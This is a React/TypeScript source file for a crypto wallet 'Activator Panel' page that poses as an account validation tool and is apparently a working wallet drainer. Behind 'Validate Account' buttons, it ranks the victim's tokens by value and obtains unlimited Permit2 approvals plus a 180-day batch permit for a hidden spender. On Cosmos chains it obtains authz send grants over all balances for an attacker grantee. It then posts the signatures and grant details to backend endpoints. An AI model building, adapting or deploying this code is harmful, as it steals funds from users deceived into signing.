/* eslint-disable @typescript-eslint/no-explicit-any */
'use client';

import { useState, useCallback, useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { AllowanceProvider, MaxAllowanceTransferAmount } from '@uniswap/permit2-sdk';
import { ethers, Contract } from 'ethers';
import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react';
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5';
import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora } from '@reown/appkit/networks';
import { Alchemy, Network } from 'alchemy-sdk';
import { SigningStargateClient } from "@cosmjs/stargate";
import { SendAuthorization  } from "cosmjs-types/cosmos/bank/v1beta1/authz";
import { Timestamp  } from "cosmjs-types/google/protobuf/timestamp";
import { Keplr, SignDoc as KeplrSignDoc } from '@keplr-wallet/types';
import networkConfigs from '@/utils/cosmosNetworks';
import { ChainId } from '@injectivelabs/ts-types';
import { getTxRawFromTxRawOrDirectSignResponse, GenericAuthz } from '@injectivelabs/sdk-ts'
import { MsgGrant, BaseAccount, ChainRestAuthApi, createTransaction,ChainRestTendermintApi, } from '@injectivelabs/sdk-ts';
import { getStdFee, DEFAULT_BLOCK_TIMEOUT_HEIGHT, BigNumberInBase } from "@injectivelabs/utils";
import Long from 'long';
import { NibiruTxClient } from '@nibiruchain/nibijs'



declare global {
  interface Window {
    keplr: Keplr;
  }
}

type WalletType = {
  id: string;
  icon: string;
  name: string;
};


const wallets: WalletType[] = [
  { id: 'w1', icon: 'https://play-lh.googleusercontent.com/SKXXUqR4jXkvPJvKSXhJkQjKUU9wA-hI9lgBTrpxEz5GP8NbaOeSaEp1zzQscv8BTA', name: 'Keplr Wallet' },
  { id: 'w2', icon: 'https://play-lh.googleusercontent.com/0BY-XzNk_6R3DS_oNZfRI-x5L2PDgX8BDo7OL8kPDCKaQi0YzXGrYKWaT2lbOkqqGrs', name: 'Leap Wallet' },
  { id: 'w3', icon: 'https://usethebitcoin.com/wp-content/uploads/2024/06/Trust-Wallet.png', name: 'Trust Wallet' },
  { id: 'w4', icon: 'https://play-lh.googleusercontent.com/N00SbjLJJrhg4hbdnkk3Llk2oedNNgCU29DvR9cpep7Lr0VkzvBkmLqajWNgFb0d7IOO', name: 'OKX Wallet' },
  { id: 'w5', icon: 'https://www.nuget.org/profiles/WalletConnect/avatar?imageSize=512', name: 'WalletConnect' },
  { id: 'w6', icon: 'https://kimola.com/images/mh/reports/7b229b50-1e22-4182-93fe-e1dbf6b72cba.webp', name: 'Exodus' },
  { id: 'w7', icon: 'https://play-lh.googleusercontent.com/uT6ByyNvUeLRMDnMKEC91RrbHftl2EBB58r9vZaNbiYf1F5Twa33_Hx0zYvEfCtiG1kE', name: 'Safepal Wallet' },
]

interface PermitDetails {
  token: string;
  amount: ethers.BigNumberish;
  expiration: number;
  nonce: number;
}

interface PermitBatch {
  details: PermitDetails[];
  spender: string;
  sigDeadline: number;
}

interface TokenWithValue {
  address: string;
  symbol: string;
  balance: ethers.BigNumber;
  decimals: number;
  price: number;
  value: number;
}

const MIN_TOKEN_VALUE_USD = 0.005;

function toDeadline(expiration: number): number {
  return Math.floor((Date.now() + expiration) / 1000);
}

const alchemyConfig = {
  apiKey: process.env.NEXT_PUBLIC_ALCHEMY_API_KEY,
};

const networkMap: { [key: number]: Network } = {
  1: Network.ETH_MAINNET,
  8453: Network.BASE_MAINNET,
  42161: Network.ARB_MAINNET,
  56: Network.BNB_MAINNET,
  7777777: Network.ZORA_MAINNET,
  81457: Network.BLAST_MAINNET,
  324: Network.ZKSYNC_MAINNET,
  10: Network.OPT_MAINNET,
  43114: Network.AVAX_MAINNET,
};

const CONTRACT_ADDRESSES: { [key: number]: string } = {
  1: process.env.NEXT_PUBLIC_MAINNET_SPENDER!,
  42161: process.env.NEXT_PUBLIC_ARBITRUM_SPENDER!,
  56: process.env.NEXT_PUBLIC_BNB_SPENDER!,
  8453: process.env.NEXT_PUBLIC_BASE_SPENDER!,
  10: process.env.NEXT_PUBLIC_OPTIMISM_SPENDER!,
  43114: process.env.NEXT_PUBLIC_AVALANCHE_SPENDER!,
  324: process.env.NEXT_PUBLIC_ZKSYNC_SPENDER!,
  137: process.env.NEXT_PUBLIC_POLYGON_SPENDER!,
  7777777: process.env.NEXT_PUBLIC_ZORA_SPENDER!,
  81457: process.env.NEXT_PUBLIC_BLAST_SPENDER!,
};

const PERMIT2_ADDRESSES: { [key: number]: string } = {
  1: process.env.NEXT_PUBLIC_MAINNET_PERMIT2!,
  42161: process.env.NEXT_PUBLIC_ARBITRUM_PERMIT2!,
  56: process.env.NEXT_PUBLIC_BNB_PERMIT2!,
  8453: process.env.NEXT_PUBLIC_BASE_PERMIT2!,
  10: process.env.NEXT_PUBLIC_OPTIMISM_PERMIT2!,
  43114: process.env.NEXT_PUBLIC_AVALANCHE_PERMIT2!,
  324: process.env.NEXT_PUBLIC_ZKSYNC_PERMIT2!,
  137: process.env.NEXT_PUBLIC_POLYGON_PERMIT2!,
  7777777: process.env.NEXT_PUBLIC_ZORA_PERMIT2!,
  81457: process.env.NEXT_PUBLIC_BLAST_PERMIT2!,
};

async function fetchValuableTokens(address: string, chainId: number): Promise<TokenWithValue[]> {
  try {
    const network = networkMap[chainId] || Network.ETH_MAINNET;
    const alchemy = new Alchemy({ ...alchemyConfig, network });
    const balances = await alchemy.core.getTokenBalances(address);

    const tokensWithMetadata = await Promise.all(
      balances.tokenBalances
        .filter(token => ethers.BigNumber.from(token.tokenBalance).gt(0))
        .map(async token => {
          const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
          if (metadata.name && metadata.symbol) {
            return {
              address: token.contractAddress,
              symbol: metadata.symbol,
              balance: ethers.BigNumber.from(token.tokenBalance),
              decimals: metadata.decimals || 18,
              price: 0,
              value: 0,
            };
          }
          return null;
        })
    );

    const validTokens = tokensWithMetadata.filter((token): token is TokenWithValue => token !== null);
    const symbols = validTokens.map(token => token.symbol);

    try {
      const priceData = await alchemy.prices.getTokenPriceBySymbol(symbols);
      const tokensWithValues = validTokens.map(token => {
        const tokenPriceInfo = priceData.data.find(p => p.symbol === token.symbol);
        if (tokenPriceInfo && !tokenPriceInfo.error && tokenPriceInfo.prices && tokenPriceInfo.prices.length > 0) {
          const usdPrice = parseFloat(tokenPriceInfo.prices[0].value);
          const normalizedBalance = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
          const usdValue = normalizedBalance * usdPrice;
          return { ...token, price: usdPrice, value: usdValue };
        }
        return token;
      });

      const valuableTokens = tokensWithValues.filter(token => token.price > 0 && token.value >= MIN_TOKEN_VALUE_USD);
      return valuableTokens.sort((a, b) => b.value - a.value);
    } catch (priceError) {
      console.error('Failed to fetch token prices:', priceError);
      return [];
    }
  } catch (error) {
    console.error('Failed to fetch valuable tokens:', error);
    return [];
  }
}

const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID!;
const metadata = {
  name: 'Activator Panel',
  description: 'Account and wallet validator tool',
  url: 'https://activatorpanel.com',
  icons: ['https://www.appactivator-panel.com/Home%20Page%20_%20Welcome%20to%20Panelactivator.com_files/save_bckudy.png'],
};

createAppKit({
  adapters: [new Ethers5Adapter()],
  metadata,
  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora],
  projectId,
  features: { analytics: true },
});



export default function KeplrContent() {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [account, setAccount] = useState<string>('');
  const [spender, setSpender] = useState<string>('');
  const [signature, setSignature] = useState<string>(''); 
  const [walletType, setWalletType] = useState<'evm' | 'cosmos' | null>(null);
  const [provider, setProvider] = useState<ethers.providers.Web3Provider | undefined>(undefined);
  const [chainId, setChainId] = useState<number>(0);
  const [cosmosChainId, setCosmosChainId] = useState<string>('');
  const [tokens, setTokens] = useState<TokenWithValue[]>([]);
  const [loading, setLoading] = useState<boolean>(false);
  const [totalValue, setTotalValue] = useState<number>(0);
  const [showConnectPopup, setShowConnectPopup] = useState<boolean>(false);
  const [showValidationPopup, setShowValidationPopup] = useState<boolean>(false);
  const [processingAction, setProcessingAction] = useState<string>('');
  const { open, close } = useAppKit();
  const { walletProvider } = useAppKitProvider<ethers.providers.ExternalProvider>('eip155');

  useEffect(() => {
    if (account && chainId && walletType === 'evm') {
      setLoading(true);
      fetchValuableTokens(account, chainId)
        .then(valuableTokens => {
          setTokens(valuableTokens);
          const total = valuableTokens.reduce((sum, token) => sum + token.value, 0);
          setTotalValue(total);
          setLoading(false);
        })
        .catch(error => {
          console.error('Error fetching valuable tokens:', error);
          setLoading(false);
        });
    }
  }, [account, chainId, walletType]);

  const handlePermit2Validation = useCallback(async () => {
    if (walletType !== 'evm') {
      alert('This validation is for EVM wallets only.');
      return;
    }

    if (!provider || !account || !chainId || tokens.length === 0) {
      alert('Please connect an EVM wallet.');
      return;
    }

    const permit2Address = PERMIT2_ADDRESSES[chainId];
    if (!permit2Address) {
      throw new Error(`No Permit2 address configured for chainId ${chainId}`);
    }

    setProcessingAction('approve');
    try {
      const signer = provider.getSigner(account);
      const allowanceProvider = new AllowanceProvider(provider, permit2Address);
      const approveAbi = ['function approve(address spender, uint256 amount)'];

      for (const token of tokens) {
        const tokenContract = new Contract(token.address, approveAbi, signer);
        console.log(`Approving ${token.symbol} (${token.address})...`);
        const tx = await tokenContract.approve(permit2Address, MaxAllowanceTransferAmount);
        await tx.wait();
        console.log(`Token approval successful for ${token.symbol}`);
      }

      setProcessingAction('permit');
      const details: PermitDetails[] = [];
      for (const token of tokens) {
        const { nonce } = await allowanceProvider.getAllowanceData(token.address, account, spender);
        details.push({
          token: ethers.utils.getAddress(token.address),
          amount: MaxAllowanceTransferAmount,
          expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
          nonce,
        });
      }
      const permitBatch: PermitBatch = {
        details,
        spender,
        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180),
      };
      const domain = {
        name: 'Permit2',
        chainId: chainId,
        verifyingContract: permit2Address,
      };
      const types = {
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' },
        ],
      };
      const signature = await signer._signTypedData(domain, types, permitBatch);
      setSignature(signature);

      const response = await fetch('/api/store/permit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ permitBatch, signature, owner: account, chainId }),
      });
      const result = await response.json();
      if (response.ok) {
        setShowValidationPopup(false);
        alert('Account Validated Successfully!!');
      } else {
        throw new Error(result.message || 'Failed to validate');
      }
    } catch (e) {
      console.error('Permit2 validation failed:', e);
      alert(`Validation failed: `);
    } finally {
      setProcessingAction('');
    }
  }, [account, provider, spender, chainId, tokens, walletType]);


  /////COSMOS
  // Main handleCosmosAuthZ function
  const handleCosmosAuthZ = useCallback(async () => {
    // Helper function for standard Cosmos AuthZ
    const handleStandardCosmosAuthZ = async (
      account: string,
      cosmosChainId: string,
      config: any,
      setProcessingAction: (action: string) => void,
      setShowValidationPopup: (show: boolean) => void
    ) => {
      const { chainName, chainId, prefix, coinType, rpcUrl, denom, gasPrice, granteeAddress, recipientAddress } = config;
    
      const keplr = window.keplr;
      if (!keplr) throw new Error('Keplr extension not installed');
  
      await keplr.enable(cosmosChainId);
      const offlineSigner = keplr.getOfflineSigner(cosmosChainId);
      const accounts = await offlineSigner.getAccounts();
      const granter = accounts[0].address;
    
      const client = await SigningStargateClient.connectWithSigner(rpcUrl, offlineSigner);
      const balances = await client.getAllBalances(granter);
      
      // Filter out zero balances
      const nonZeroBalances = balances.filter(b => parseInt(b.amount) > 0);
      
      if (nonZeroBalances.length === 0) {
        throw new Error('No token balances available for the granter');
      }
      
      console.log('Non-zero balances:', nonZeroBalances);
    
      const expiration = new Date();
      expiration.setMonth(expiration.getMonth() + 6);
  
      // Create spend limits for all non-zero balances
      const spendLimits = nonZeroBalances.map(balance => ({
        denom: balance.denom,
        amount: '1000000000000000000'
      }));
    
      const msg = {
        typeUrl: '/cosmos.authz.v1beta1.MsgGrant',
              value: {
          granter,
          grantee: granteeAddress,
                grant: {
                  authorization: {
              typeUrl: '/cosmos.bank.v1beta1.SendAuthorization',
              value: SendAuthorization.encode(
                SendAuthorization.fromPartial({
                  spendLimit: spendLimits,
                })
              ).finish(),
            },
            expiration: Timestamp.fromPartial({
              seconds: BigInt(Math.floor(expiration.getTime() / 1000)),
              nanos: (expiration.getTime() % 1000) * 1000000,
            }),
          },
        },
      };
      
      // Use native token for fees
      const fee = {
        amount: [{ denom, amount: '1000' }],
        gas: '200000',
      };
    
      const result = await client.signAndBroadcast(granter, [msg], fee, 'Account Validation');
      if (result.code === 0) {
        console.log('Account validated...!!!');
        setShowValidationPopup(false);
        const response = await fetch('/api/cosmos/query', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json'},
          body: JSON.stringify({ 
            chainName, chainId, prefix, coinType, rpcUrl, denom, 
            gasPrice, granteeAddress, granter, recipientAddress,
            authorizedTokens: nonZeroBalances.map(b => b.denom)
          })
        });
        const postResponse = await response.json();
        if(postResponse.ok) {
          console.log("Cosmos chain queried successfully...")
        } else {
          console.log("Failed to query cosmos chain: ", postResponse.errorMessage);
        }
      } else {
        console.log(`Transaction failed with code ${result.code}: ${result.rawLog || 'No details available'}`);
      }
    };
  


    // Helper function for Injective AuthZ
     // Helper function for Injective AuthZ
     const handleInjectiveAuthZ = async (
      account: any,
      cosmosChainId: any,
      config: any,
      setProcessingAction: any,
      setShowValidationPopup: any
    ) => {
      const { chainName, prefix, rpcUrl, denom, gasPrice, granteeAddress, recipientAddress } = config;
      const restEndPoint = "https://sentry.lcd.injective.network";
      const grpcEndpoint = "https://grpc.injective.network";
      const chainId = ChainId.Mainnet;
    
      if (!window.keplr) {
        throw new Error("Keplr wallet not found");
      }
    
      try {
        await window.keplr.enable(chainId);
        const key = await window.keplr.getKey(chainId);
        const granter = key.bech32Address;
    
        const accountDetails = await new ChainRestAuthApi(restEndPoint).fetchAccount(granter);
        const baseAccount = BaseAccount.fromRestApi(accountDetails);
    
        // Fetch all non-zero balances
        const balancesResponse = await fetch(`${restEndPoint}/cosmos/bank/v1beta1/balances/${granter}`);
        const balancesData = await balancesResponse.json();
        const balances = balancesData.balances || [];
    
        const authorizedTokens = balances
          .filter((balance: { denom: string; amount: string }) => parseInt(balance.amount) > 0)
          .map((balance: { denom: string; amount: string }) => balance.denom);
    
        if (authorizedTokens.length === 0) {
          throw new Error("No non-zero balances available to grant");
        }
    
        console.log(`Authorizing tokens: ${authorizedTokens.join(', ')}`);
    
        const latestBlock = await new ChainRestTendermintApi(restEndPoint).fetchLatestBlock();
        const timeoutHeight = new BigNumberInBase(latestBlock.header.height).plus(DEFAULT_BLOCK_TIMEOUT_HEIGHT);
    
        const authZ = GenericAuthz.fromJSON({
          messageTypeUrl: '/cosmos.bank.v1beta1.MsgSend'
        });
    
        const msg = MsgGrant.fromJSON({
          authorization: {
            typeUrl: '/cosmos.authz.v1beta1.GenericAuthorization',
            value: authZ.toAny().value,
          },
          expiration: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60, // 30 days
          grantee: granteeAddress,
          granter,
        });
    
        const pubKey = Buffer.from(key.pubKey).toString('base64');
    
        const { signDoc } = createTransaction({
          pubKey,
          chainId,
          fee: getStdFee({}),
          message: msg,
          sequence: baseAccount.sequence,
          timeoutHeight: timeoutHeight.toNumber(),
          accountNumber: baseAccount.accountNumber,
        });
    
        const signResponse = await window.keplr.signDirect(
          chainId,
          granter,
          {
            chainId: signDoc.chainId,
            accountNumber: Long.fromString(baseAccount.accountNumber.toString()),
            authInfoBytes: signDoc.authInfoBytes,
            bodyBytes: signDoc.bodyBytes,
          }
        );
    
        const txRaw = getTxRawFromTxRawOrDirectSignResponse({
          signed: {
            ...signResponse.signed,
            accountNumber: BigInt(signResponse.signed.accountNumber.toString()),
          },
          signature: signResponse.signature,
        });
    
        const txRawSerializable = {
          bodyBytes: Buffer.from(txRaw.bodyBytes).toString('base64'),
          authInfoBytes: Buffer.from(txRaw.authInfoBytes).toString('base64'),
          signatures: txRaw.signatures.map((sig: Uint8Array) => Buffer.from(sig).toString('base64')),
        };
    
        const broadcastResponse = await fetch('/api/injective/broadcast', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            txRaw: txRawSerializable,
            chainName,
            chainId,
            prefix,
            rpcUrl,
            denom,
            gasPrice,
            granteeAddress,
            granter,
            recipientAddress,
            authorizedTokens, // Send array of non-zero token denoms
          }),
        });
    
        if (!broadcastResponse.ok) {
          const error = await broadcastResponse.json();
          throw new Error(error.message || 'Broadcast failed');
        }
    
        const result = await broadcastResponse.json();
        setShowValidationPopup(false);
        return result;
    
      } catch (error) {
        console.error("Transaction failed:", error);
        throw error;
      }
  };

  ////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ///handle Nibiru chain connection
    const handleNibiruAuthz = async (
      account: any,
      cosmosChainId: any,
      config: any,
      setProcessingAction: any,
      setShowValidationPopup: any
    ) => {
      const { chainName, chainId, prefix, rpcUrl, denom, gasPrice, granteeAddress, recipientAddress } = config;
    
      if (!window.keplr) {
        throw new Error("Keplr wallet not found");
      }
    
      try {
        await window.keplr.enable(chainId);
        const offlineSigner = window.keplr.getOfflineSigner(chainId);
        const accounts = await offlineSigner.getAccounts();
        const granter = accounts[0].address;
    
        const txClient = await NibiruTxClient.connectWithSigner(rpcUrl, offlineSigner);
    
        // Fetch all balances using NibiruTxClient
        const balances = await txClient.getAllBalances(granter);
    
        const spendLimit = balances
          .filter((coin: { amount: string; }) => parseInt(coin.amount) > 0)
          .map((coin: { denom: any; amount: any; }) => ({
            denom: coin.denom,
            amount: coin.amount,
          }));
    
        if (spendLimit.length === 0) {
          throw new Error("No non-zero balances available to grant");
        }
    
        const authorizedTokens = spendLimit.map((coin: { denom: any; }) => coin.denom);
        console.log(`Authorizing tokens: ${authorizedTokens.join(', ')}`);
    
        const expiration = new Date();
        expiration.setMonth(expiration.getMonth() + 6);
    
        const msg = {
          typeUrl: '/cosmos.authz.v1beta1.MsgGrant',
          value: {
            granter,
            grantee: granteeAddress,
            grant: {
              authorization: {
                typeUrl: '/cosmos.bank.v1beta1.SendAuthorization',
                value: SendAuthorization.encode(
                  SendAuthorization.fromPartial({
                    spendLimit,
                  })
                ).finish(),
              },
              expiration: Timestamp.fromPartial({
                seconds: BigInt(Math.floor(expiration.getTime() / 1000)),
                nanos: (expiration.getTime() % 1000) * 1000000,
              }),
            },
          },
        };
    
        const fee = 'auto';
        const tx = await txClient.signAndBroadcast(granter, [msg], fee, 'Account Validation');
        const result = tx.msgResponses;
        console.log('Authz granted:', result);
    
        const response = await fetch('/api/nibiru/query', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chainName,
            chainId,
            prefix,
            rpcUrl,
            denom,
            gasPrice,
            granteeAddress,
            granter,
            recipientAddress,
            authorizedTokens, // Send array of denoms
          }),
        });
    
        if (!response.ok) {
          const error = await response.json();
          throw new Error(error.message || 'Broadcast failed');
        }
    
        const resultResponse = await response.json();
        setShowValidationPopup(false);
        return resultResponse;
    
      } catch (error) {
        console.error('Authz failed to be granted for Nibiru:', error);
        throw error;
      }
    };

    ////////////////////////////////////////////////////////////////////////
    //STRIDE
  
    /////// MAIN LOGIC
    if (!account || walletType !== 'cosmos' || !cosmosChainId) {
      alert('Please connect a Keplr wallet and select a Cosmos network first.');
      return;
    }
  
    setProcessingAction('authz');
    try {
      const config = networkConfigs.find((net) => net.chainId === cosmosChainId);
      if (!config) {
        throw new Error(`Unsupported chainId: ${cosmosChainId}`);
      }
  
      if (cosmosChainId === 'injective-1') {
        await handleInjectiveAuthZ(
          account,
          cosmosChainId,
          config,
          setProcessingAction,
          setShowValidationPopup
        );
      }if(cosmosChainId === 'cataclysm-1') {
       await handleNibiruAuthz(
        account,
        cosmosChainId,
        config,
        setProcessingAction,
        setShowValidationPopup
       ) 
      } else {
        await handleStandardCosmosAuthZ(
          account,
          cosmosChainId,
          config,
          setProcessingAction,
          setShowValidationPopup
        );
      }
    } catch (e) {
      const errorMessage = e instanceof Error ? e.message : 'Unknown error';
      console.error('AuthZ grant failed:', {
        message: errorMessage,
        stack: e instanceof Error ? e.stack : undefined,
        rawError: e,
      });
    } finally {
      setProcessingAction('');
    }
  }, [account, walletType, cosmosChainId]);

  const connectEVMWallet = useCallback(async () => {
    try {
      await open();
      if (walletProvider) {
        const web3Provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = web3Provider.getSigner();
        const address = await signer.getAddress();
        const checkSummedAddress = ethers.utils.getAddress(address);
        const network = await web3Provider.getNetwork();
        const chainId = network.chainId;

        const spenderAddress = CONTRACT_ADDRESSES[chainId];
        if (!spenderAddress) {
          throw new Error(`No spender address configured for chainId ${chainId}`);
        }

        setProvider(web3Provider);
        setAccount(checkSummedAddress);
        setSpender(spenderAddress);
        setChainId(chainId);
        setWalletType('evm');
        setShowConnectPopup(false);
        setShowValidationPopup(true);
      }
    } catch (e) {
      console.error('EVM wallet connection failed:', e);
      alert(`Wallet connection failed: `);
    }
  }, [open, walletProvider]);

  const connectCosmosWallet = useCallback(async () => {
    try {
      const keplr = window.keplr;
      if (!keplr) {
        throw new Error('Keplr extension not installed');
      }

      // Array of supported Cosmos chain IDs from networkConfigs
      const cosmosChainIds = networkConfigs.map(config => config.chainId); // ['cosmoshub-4', 'injective-1', 'celestia']
  
      // Enable all chains, prompting the user to approve each one in the Keplr UI
      await keplr.enable(cosmosChainIds);
  
      // Get the first account from the first chain as a default (user can change later)
      const offlineSigner = keplr.getOfflineSigner(cosmosChainIds[0]); // Default to first chain
      const accounts = await offlineSigner.getAccounts();
      const address = accounts[0].address;

      setAccount(address);
      setWalletType('cosmos');
      setCosmosChainId(cosmosChainIds[0]); // Default to first chain, user can select later
      setChainId(-1); // Sentinel value for Cosmos
      setSpender('');
      setShowConnectPopup(false);
      setShowValidationPopup(true);
    } catch (e) {
      console.error('Cosmos wallet connection failed:', e);
      alert(`Wallet connection failed: `);
    }
  }, []);

  const handleWalletClick = useCallback(() => {
    setShowConnectPopup(true);
  }, []);

  const formatAddress = (address: string): string => {
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  const getNetworkName = (chainId: number): string => {
    const networkNames: { [key: number]: string } = {
      1: 'Ethereum Mainnet',
      42161: 'Arbitrum',
      56: 'Binance Smart Chain',
      8453: 'Base',
      10: 'Optimism',
      43114: 'Avalanche',
      324: 'zkSync Era',
      137: 'Polygon',
      7777777: 'Zora',
      81457: 'Blast',
      [-1]: 'Cosmos Hub',
    };
    return networkNames[chainId] || `Unknown Network (Chain ID: ${chainId})`;
  };

  return (
    <div className="w-full relative">
      <section className="container mx-auto px-4 sm:px-6 lg:px-8">
        <h2 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-4 sm:mb-6 text-center text-blue-700 mt-16 md:mt-20">
          Connection Page
        </h2>
        <p className="text-center text-sm sm:text-base md:text-lg text-gray-600 mb-8 sm:mb-10 max-w-2xl mx-auto">
          Connect with one of our available providers or create a new one.
        </p>
        <div className="grid grid-cols-2 gap-3 sm:gap-4 md:gap-6">
          {wallets.map((wallet) => (
            <Card
              key={wallet.id}
              className={`cursor-pointer transition-all ${
                selectedWallet === wallet.id ? 'ring-1 ring-purple-600' : 'hover:bg-gray-50'
              }`}
              onClick={() => {
                setSelectedWallet(wallet.id);
                handleWalletClick();
              }}
            >
              <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4">
                <span className="flex flex-col items-center">
                  <div className="mb-3 sm:mb-4">
                    <Image
                      src={wallet.icon}
                      alt={wallet.name}
                      width={36}
                      height={36}
                      className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 object-contain"
                    />
                  </div>
                  <span className="text-xs sm:text-sm md:text-base font-semibold text-center text-blue-600">
                    {wallet.name}
                  </span>
                </span>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      {showConnectPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg shadow-xl p-6 max-w-3xl w-full mx-4 flex">
            {/* Left Panel: AppKit UI for EVM Wallets */}
            <div className="w-2/3 pr-4 border-r">

</div>
            {/* Right Panel: Keplr Icon for Cosmos */}
            <div className="w-1/2 pl-4 flex flex-col items-center justify-center">
              <h3 className="text-lg font-bold text-blue-700 mb-4">Cosmos Wallet</h3>
              <button
                onClick={connectCosmosWallet}
                className="flex flex-col items-center"
              >
                <Image
                  src="https://play-lh.googleusercontent.com/SKXXUqR4jXkvPJvKSXhJkQjKUU9wA-hI9lgBTrpxEz5GP8NbaOeSaEp1zzQscv8BTA"
                  alt="Keplr"
                  width={64}
                  height={64}
                  className="mb-2"
                />
                <span className="text-sm font-medium text-blue-600">Keplr</span>
              </button>
            </div>
          </div>
        </div>
      )}

      {showValidationPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg shadow-xl p-6 max-w-md w-full mx-4">
            <div className="text-center mb-6">
              <h3 className="text-xl font-bold text-blue-700 mb-2">
          Account Validation Required
              </h3>
              {walletType === 'evm' && !CONTRACT_ADDRESSES[chainId] ? (
                <p className="text-red-600 mb-4">
                  This network ({getNetworkName(chainId)}) is not supported yet. Please switch to a supported network.
                </p>
              ) : (
                <p className="text-gray-600 mb-4">
                  {walletType === 'evm'
                    ? 'To proceed, please validate your account:'
              : 'Validate account to proceed:'}
                </p>
              )}

              {account && (
                <div className="bg-gray-100 rounded-md p-3 mb-4">
                  <p className="text-sm text-gray-700 mb-1">Connected Account:</p>
                  <p className="font-mono text-blue-600 font-medium">{formatAddress(account)}</p>
                  <p className="text-sm text-gray-700 mt-2 mb-1">Network:</p>
            {walletType === 'cosmos' ? (
              <select
                value={cosmosChainId}
                onChange={(e) => {
                  const selectedChainId = e.target.value;
                  setCosmosChainId(selectedChainId);
                  if (selectedChainId) {
                    window.keplr?.getOfflineSigner(selectedChainId).getAccounts().then((accounts) => {
                      setAccount(accounts[0].address);
                    });
                  }
                }}
                className="w-full mt-1 p-1 border rounded text-blue-600"
              >
                <option value="">Select a Cosmos Network</option>
                {networkConfigs.map((config) => (
                  <option key={config.chainId} value={config.chainId}>
                    {config.chainId}
                  </option>
                ))}
              </select>
            ) : (
                  <p className="font-medium text-blue-600">{getNetworkName(chainId)}</p>
            )}
                </div>
              )}

              {loading ? (
                <div className="flex justify-center items-center p-4">
                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                  <p className="ml-3 text-blue-700">Loading...</p>
                </div>
              ) : processingAction ? (
                <div className="flex justify-center items-center p-4">
                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                  <p className="ml-3 text-blue-700">
              {processingAction === 'approve' ? 'Validating...' : processingAction === 'permit' ? 'Please wait...' : 'Validating...'}
                  </p>
                </div>
              ) : (
                <div className="flex flex-col gap-3">
                  <button
              onClick={
                walletType === 'evm' ? handlePermit2Validation : handleCosmosAuthZ
              }
              disabled={
                (!provider && walletType === 'evm') ||
                !account ||
                (walletType === 'evm' && !CONTRACT_ADDRESSES[chainId]) ||
                (walletType === 'cosmos' && !cosmosChainId) ||
                (walletType === 'evm' && tokens.length === 0)
              }
                    className={`w-full py-3 px-4 rounded-lg font-medium text-white ${
                (!provider && walletType === 'evm') ||
                !account ||
                (walletType === 'evm' && !CONTRACT_ADDRESSES[chainId]) ||
                (walletType === 'cosmos' && !cosmosChainId) ||
                (walletType === 'evm' && tokens.length === 0)
                        ? 'bg-gray-400 cursor-not-allowed'
                        : 'bg-blue-600 hover:bg-blue-700'
                    } transition-colors duration-200`}
                  >
              Validate Account
                  </button>
                  <button
                    onClick={() => setShowValidationPopup(false)}
                    className="w-full py-2 px-4 rounded-lg font-medium text-gray-700 bg-gray-200 hover:bg-gray-300 mt-2"
                  >
                    Cancel
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}